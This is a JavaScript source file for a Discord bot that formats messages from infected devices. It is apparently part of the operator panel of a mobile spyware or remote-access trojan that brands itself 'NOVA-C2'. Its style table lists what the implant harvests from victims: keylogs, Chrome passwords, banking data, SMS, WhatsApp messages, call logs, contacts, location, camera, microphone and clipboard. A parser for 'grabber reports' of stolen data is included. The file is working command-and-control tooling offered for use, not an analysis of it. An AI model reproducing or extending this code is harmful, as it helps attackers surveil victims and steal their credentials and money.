import { EmbedBuilder } from 'discord.js'
import { C, ts } from '../utils/index.js'
import { ICONS } from '../icons.js'

const STYLES = [
  { pattern: /^:x:/,                   color: C.blood,     icon: '❌',   title: 'FAILED' },
  { pattern: /^:shield:/,              color: C.gold,      icon: '🛡️',  title: 'DEVICE ADMIN' },
  { pattern: /^:microscope:/,          color: C.purple,    icon: '🔬',   title: 'PROCESSES' },
  { pattern: /^:tv:/,                  color: C.electric,  icon: '📺',   title: 'SCREEN CAPTURE' },
  { pattern: /^:package:/,             color: C.gold,      icon: '📦',   title: 'UPDATE' },
  { pattern: /^:arrow_down:/,          color: C.electric,  icon: '⬇️',  title: 'DOWNLOADING' },
  { pattern: /^:green_circle:/,        color: C.venom,     icon: '🟢',   title: 'DEVICE ONLINE' },
  { pattern: /^:red_circle:/,          color: C.blood,     icon: '🔴',   title: 'CONNECTION LOST' },
  { pattern: /^:warning:/,             color: C.gold,      icon: '⚠️',  title: 'WARNING' },
  { pattern: /^:round_pushpin:/,       color: C.electric,  icon: '📍',   title: 'LOCATION' },
  { pattern: /^:camera:/,              color: C.blood,     icon: '📷',   title: 'CAMERA' },
  { pattern: /^:satellite:|^:signal:/, color: C.purple,    icon: '📡',   title: 'STREAM' },
  { pattern: /^✅/,                     color: C.venom,     icon: '✅',   title: 'SUCCESS' },
  { pattern: /^ℹ️/,                     color: C.info,      icon: 'ℹ️',   title: 'INFO' },
  { pattern: /^:clipboard:/,           color: C.info,      icon: '📋',   title: 'CLIPBOARD' },
  { pattern: /^:key:/,                 color: C.gold,      icon: '🔑',   title: 'KEYLOG' },
  { pattern: /^:battery:/,             color: C.venom,     icon: '🔋',   title: 'BATTERY' },
  { pattern: /^:headphone:/,           color: C.purple,    icon: '🎧',   title: 'MICROPHONE' },
  { pattern: /^:telephone_receiver:/,  color: C.electric,  icon: '📞',   title: 'CALL LOG' },
  { pattern: /^:envelope:/,            color: C.electric,  icon: '✉️',   title: 'SMS' },
  { pattern: /^:busts_in_silhouette:/, color: C.purple,    icon: '👥',   title: 'CONTACTS' },
  { pattern: /^:heartbeat:/,           color: C.neon,      icon: '💓',   title: 'HEARTBEAT', skip: true },
  { pattern: /^:green_heart:/,         color: C.venom,     icon: '💚',   title: 'ALIVE', skip: true },
  { pattern: /^⚠️/,                     color: C.gold,      icon: '⚠️',  title: 'WARNING' },
  { pattern: /^🔍/,                     color: C.purple,    icon: '🔍',   title: 'GRABBER RESULT' },
  { pattern: /^📄/,                     color: C.gold,      icon: '📄',   title: 'DOCUMENT' },
  { pattern: /^💬/,                     color: C.purple,    icon: '💬',   title: 'WHATSAPP' },
  { pattern: /^🔐/,                     color: C.gold,      icon: '🔐',   title: 'CHROME PASSWORDS' },
  { pattern: /^🏦/,                     color: C.gold,      icon: '🏦',   title: 'BANKING' },
]

export function formatDeviceResponse(content, deviceName = 'Device') {
  if (!content || content.length < 3) return null
  const lines = content.split('\n')
  const firstLine = lines[0].trim()

  // Match known style from first line
  let style = null
  for (const s of STYLES) {
    if (s.pattern.test(firstLine)) {
      if (s.skip) return null
      style = s
      break
    }
  }

  let title = style ? `${style.icon} ${style.title}` : '📟 DEVICE RESPONSE'
  let color = style ? style.color : C.purple

  // Extract device name from first line if it contains "— Model"
  const deviceMatch = firstLine.match(/—\s*(.+?)(?:\s*\||$)/)
  const resolvedName = deviceMatch ? deviceMatch[1].trim() : deviceName

  // Parse structured content
  const fields = []
  const descLines = []
  let inBox = false
  let boxBuffer = ''
  let grabberReport = false

  for (let i = style ? 1 : 0; i < lines.length; i++) {
    const raw = lines[i]
    const trimmed = raw.trim()
    if (!trimmed) { descLines.push(raw); continue }

    // Detect grabber report borders
    if (trimmed.includes('═══════════════════════════════════════════')) {
      grabberReport = true
      continue
    }
    if (grabberReport) {
      descLines.push(raw)
      continue
    }

    // Detect box-drawn borders
    if (/^[╔╚╠]/.test(trimmed)) {
      inBox = !inBox || trimmed.startsWith('╚')
      if (inBox) { boxBuffer = ''; continue }
      if (!inBox && boxBuffer) {
        for (const bl of boxBuffer.split('\n')) {
          const clean = bl.replace(/[║╔╚╠╣╗╝═]/g, '').trim()
          if (clean && clean.includes(':')) {
            const [k, ...v] = clean.split(':').map(s => s.trim())
            if (k && v.length && k.length < 40) fields.push({ name: k, value: v.join(':'), inline: true })
          }
        }
        boxBuffer = ''
      }
      continue
    }
    if (inBox) { boxBuffer += trimmed + '\n'; continue }
    if (/^[║╠╣╗╝═]/.test(trimmed)) continue

    // Parse "Key   : Value" (with multiple spaces or tabs)
    const kvMatch = trimmed.match(/^([A-Za-z\u00C0-\u024F][A-Za-z0-9\u00C0-\u024F\s()/]{1,30}?)\s{2,}:\s(.+)/)
    if (kvMatch && kvMatch[1].trim().length < 35) {
      fields.push({ name: kvMatch[1].trim(), value: kvMatch[2].trim().slice(0, 1024), inline: true })
      continue
    }
    // Parse "Key: Value" (single colon)
    const kvMatch2 = trimmed.match(/^([A-Za-z0-9][A-Za-z0-9\s()/._-]{1,25}?):\s(.+)/)
    if (kvMatch2 && kvMatch2[1].trim().length < 30 && kvMatch2[2].length < 200 && !trimmed.startsWith('http')) {
      fields.push({ name: kvMatch2[1].trim(), value: kvMatch2[2].trim().slice(0, 1024), inline: true })
      continue
    }

    descLines.push(raw)
  }

  // For grabber reports, enhance title
  if (grabberReport) {
    if (lines.find(l => l.includes('SMART GRAB REPORT'))) title = `🔍 GRABBER REPORT`
    color = C.crimson
  }

  const desc = descLines.filter(l => l.trim()).join('\n').slice(0, 4000) || ''
  const embedDesc = fields.length > 0
    ? (desc || 'Response received')
    : `\`\`\`${content.replace(/`/g, '\u200B`').slice(0, 4080)}\`\`\``
  const embed = new EmbedBuilder()
    .setColor(color)
    .setAuthor({ name: resolvedName, iconURL: ICONS.footer || undefined })
    .setTitle(title)
    .setDescription(embedDesc)
    .setTimestamp()

  if (fields.length > 0) embed.addFields(fields.slice(0, 25))
  embed.setFooter({ text: `NOVA-C2 ⚡ ${ts()}`, iconURL: ICONS.footer || undefined })

  return { embeds: [embed] }
}
